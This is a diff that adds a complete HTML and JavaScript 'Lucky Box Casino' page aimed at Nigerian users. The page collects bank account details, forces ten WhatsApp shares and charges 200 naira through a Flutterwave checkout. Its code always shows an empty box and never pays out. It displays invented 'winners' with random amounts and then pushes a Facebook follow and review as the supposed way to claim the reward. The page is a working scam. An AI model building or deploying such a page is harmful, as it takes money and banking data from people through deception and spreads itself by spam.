@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ultra Premium Lucky Box Casino</title>
+  <script src="https://checkout.flutterwave.com/v3.js"></script>
+  <style>
+    /* Global Styles */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+      color: #fff;
+    }
+    .header {
+      text-align: center;
+      padding: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      color: #ffd700; /* gold color */
+      text-shadow: 2px 2px 4px #000;
+    }
+    .page {
+      padding: 20px;
+      max-width: 600px;
+      margin: 20px auto;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(5px);
+    }
+    .top-image {
+      width: 100%;
+      object-fit: cover;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+    /* Smaller image for home page */
+    .small-image {
+      max-height: 100px;
+    }
+    /* Larger image for other pages */
+    .large-image {
+      max-height: 200px;
+    }
+    form input, form button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      outline: none;
+    }
+    form input {
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+    form input::placeholder {
+      color: #ddd;
+    }
+    form button {
+      background: linear-gradient(45deg, #ffd700, #ff8c00);
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    form button:hover {
+      background: linear-gradient(45deg, #ff8c00, #ffd700);
+    }
+    .share-btn, .proceed-btn, .payment-btn, .claim-btn {
+      padding: 15px;
+      background: linear-gradient(45deg, #1ed760, #1db954);
+      color: #fff;
+      border-radius: 5px;
+      font-size: 16px;
+      margin: 10px 0;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .share-btn:hover, .proceed-btn:hover, .payment-btn:hover, .claim-btn:hover {
+      transform: scale(1.02);
+    }
+    .payment-btn {
+      background: linear-gradient(45deg, #0275d8, #0056b3);
+    }
+    .progress-container {
+      width: 100%;
+      background: #444;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 20px 0;
+      height: 20px;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: #4caf50;
+      transition: width 0.3s ease;
+    }
+    .lucky-box {
+      width: 200px;
+      height: 200px;
+      background: gold;
+      margin: 20px auto;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      color: #000;
+      position: relative;
+      transition: transform 0.5s;
+    }
+    .spin {
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .fb-prompt {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .fb-prompt img {
+      width: 50px;
+      height: 50px;
+      cursor: pointer;
+    }
+    #fbCountdown {
+      font-size: 20px;
+      margin-top: 10px;
+    }
+    /* Testimonial Slider */
+    #testimonial-slider {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 18px;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 10px;
+      border-radius: 5px;
+    }
+    footer {
+      text-align: center;
+      padding: 10px;
+      font-size: 12px;
+      color: #ccc;
+      margin-top: 20px;
+    }
+    @media (max-width: 600px) {
+      .page {
+        margin: 10px;
+        padding: 15px;
+      }
+      .header {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top header message -->
+  <div class="header">WIN UP TO 500,000 NAIRA</div>
+
+  <!-- Page 1: User Information Form & Testimonials Slider -->
+  <div id="page1" class="page">
+    <img src="https://i.postimg.cc/mkZzJ93L/285087620fa97722529c72da62df1b5c.jpg" alt="Top Image" class="top-image small-image">
+    <form onsubmit="event.preventDefault(); submitForm();">
+      <input type="text" id="userName" placeholder="User Name" required>
+      <input type="text" id="accountName" placeholder="Account Name" required>
+      <input type="number" id="accountNumber" placeholder="Account Number" required>
+      <input type="text" id="bankName" placeholder="Bank Name" required>
+      <button type="submit">Submit</button>
+    </form>
+    <div id="testimonial-slider">Loading winners...</div>
+  </div>
+
+  <!-- Page 2: WhatsApp Share Page -->
+  <div id="page2" class="page" style="display:none;">
+    <img src="https://i.postimg.cc/mkZzJ93L/285087620fa97722529c72da62df1b5c.jpg" alt="Top Image" class="top-image large-image">
+    <p>Share to 10 WhatsApp  group or contacts to proceed - only active group.</p>
+    <button class="share-btn" onclick="shareOnWhatsApp()">Share on WhatsApp</button>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <button id="proceedBtn" class="proceed-btn" onclick="proceedToPayment()" disabled>Proceed</button>
+  </div>
+
+  <!-- Page 3: Payment Page -->
+  <div id="page3" class="page" style="display:none;">
+    <img src="https://i.postimg.cc/mkZzJ93L/285087620fa97722529c72da62df1b5c.jpg" alt="Top Image" class="top-image large-image">
+    <p>Buy a Lucky Box for 200 Naira</p>
+    <button class="payment-btn" onclick="makePayment()">Buy Lucky Box</button>
+  </div>
+
+  <!-- Page 4: Lucky Box Animation & Claim Reward -->
+  <div id="page4" class="page" style="display:none;">
+    <img src="https://i.postimg.cc/mkZzJ93L/285087620fa97722529c72da62df1b5c.jpg" alt="Top Image" class="top-image large-image">
+    <div id="luckyBox" class="lucky-box">
+      <span id="countdown"></span>
+    </div>
+    <div id="resultMessage" style="text-align: center; font-size: 18px; margin-top: 20px;"></div>
+    <!-- Claim Reward button appears after the box opens -->
+    <button id="claimBtn" class="claim-btn" style="display:none;" onclick="showFbPrompt()">Claim Reward</button>
+    <!-- Facebook prompt hidden initially -->
+    <div id="fbPrompt" class="fb-prompt" style="display:none;">
+      <p>Follow on Facebook and write a review to claim</p>
+      <img id="fbLogo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+      <div id="fbCountdown"></div>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 Topfan. All rights reserved.
+  </footer>
+
+  <script>
+    let shareCount = 0;
+    
+    // Automated testimonial slider with random Nigerian names and win amounts
+    const testimonials = [
+      "Adeola won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Chinedu won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Emeka won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Fatima won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Ibrahim won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Ngozi won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Olumide won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Uche won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Aisha won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString(),
+      "Kunle won ₦" + (Math.floor(Math.random() * 100000) + 1000).toLocaleString()
+    ];
+    let testimonialIndex = 0;
+    function updateTestimonial() {
+      const slider = document.getElementById('testimonial-slider');
+      slider.innerText = testimonials[testimonialIndex];
+      testimonialIndex = (testimonialIndex + 1) % testimonials.length;
+    }
+    setInterval(updateTestimonial, 3000);
+    updateTestimonial();
+
+    // Form validation and proceed to WhatsApp share page
+    function submitForm() {
+      const userName = document.getElementById('userName').value;
+      const accountName = document.getElementById('accountName').value;
+      const accountNumber = document.getElementById('accountNumber').value;
+      const bankName = document.getElementById('bankName').value;
+      
+      if (!userName || !accountName || !accountNumber || !bankName) {
+        alert("Please fill all the fields.");
+        return;
+      }
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'block';
+    }
+
+    // Simulate WhatsApp sharing and update progress
+    function shareOnWhatsApp() {
+      if (shareCount >= 10) return;
+      const message = encodeURIComponent("Hey, check out this amazing site: " + window.location.href + " - It's awesome!");
+      const url = "https://api.whatsapp.com/send?text=" + message;
+      window.open(url, '_blank');
+      
+      shareCount++;
+      updateProgressBar();
+    }
+
+    function updateProgressBar() {
+      const progressBar = document.getElementById('progressBar');
+      const percentage = (shareCount / 10) * 100;
+      progressBar.style.width = percentage + "%";
+      
+      if (shareCount >= 10) {
+        document.getElementById('proceedBtn').disabled = false;
+      }
+    }
+
+    function proceedToPayment() {
+      document.getElementById('page2').style.display = 'none';
+      document.getElementById('page3').style.display = 'block';
+    }
+
+    // Flutterwave payment integration using your provided public key
+    function makePayment() {
+      FlutterwaveCheckout({
+        public_key: "FLWPUBK-e1353563c836f63dc0c41e51544daaa8-X",
+        tx_ref: "rave-" + Date.now(),
+        amount: 200,
+        currency: "NGN",
+        payment_options: "card, banktransfer, ussd",
+        customer: {
+          email: "user@example.com", // default email since Gmail field is removed
+          phonenumber: "0123456789",
+          name: document.getElementById('userName').value,
+        },
+        callback: function (data) {
+          if(data.status === "successful"){
+            document.getElementById('page3').style.display = 'none';
+            document.getElementById('page4').style.display = 'block';
+            startLuckyBoxAnimation();
+          } else {
+            alert("Payment was not successful. Please try again.");
+          }
+        },
+        onclose: function() {},
+        customizations: {
+          title: "Lucky Box",
+          description: "Buy a Lucky Box for 200 Naira",
+          logo: "https://i.postimg.cc/mkZzJ93L/285087620fa97722529c72da62df1b5c.jpg",
+        },
+      });
+    }
+
+    // Lucky box spinning and countdown animation
+    function startLuckyBoxAnimation() {
+      const box = document.getElementById('luckyBox');
+      const countdownDisplay = document.getElementById('countdown');
+      let count = 5;
+      box.classList.add('spin');
+      countdownDisplay.innerText = count;
+      
+      const interval = setInterval(() => {
+        count--;
+        countdownDisplay.innerText = count;
+        if (count <= 0) {
+          clearInterval(interval);
+          box.classList.remove('spin');
+          box.innerText = "";
+          document.getElementById('resultMessage').innerText = "Sorry the box is empty. You can try again, you may be lucky.";
+          // Show Claim Reward button after a brief delay
+          setTimeout(() => {
+            document.getElementById('claimBtn').style.display = 'block';
+          }, 500);
+        }
+      }, 1000);
+    }
+
+    // Show Facebook prompt after clicking Claim Reward
+    function showFbPrompt() {
+      document.getElementById('claimBtn').style.display = 'none';
+      document.getElementById('fbPrompt').style.display = 'block';
+    }
+
+    // Facebook redirection: when the Facebook logo is clicked,
+    // open the link and start a 5-second countdown before redirecting home.
+    document.getElementById('fbLogo').addEventListener('click', function() {
+      window.open("https://www.facebook.com/share/16NrVLmJax/", '_blank');
+      let fbCount = 5;
+      const fbCountdownElem = document.getElementById('fbCountdown');
+      fbCountdownElem.innerText = "Redirecting in " + fbCount + " seconds...";
+      const fbInterval = setInterval(() => {
+        fbCount--;
+        fbCountdownElem.innerText = "Redirecting in " + fbCount + " seconds...";
+        if (fbCount <= 0) {
+          clearInterval(fbInterval);
+          window.location.href = window.location.origin;
+        }
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
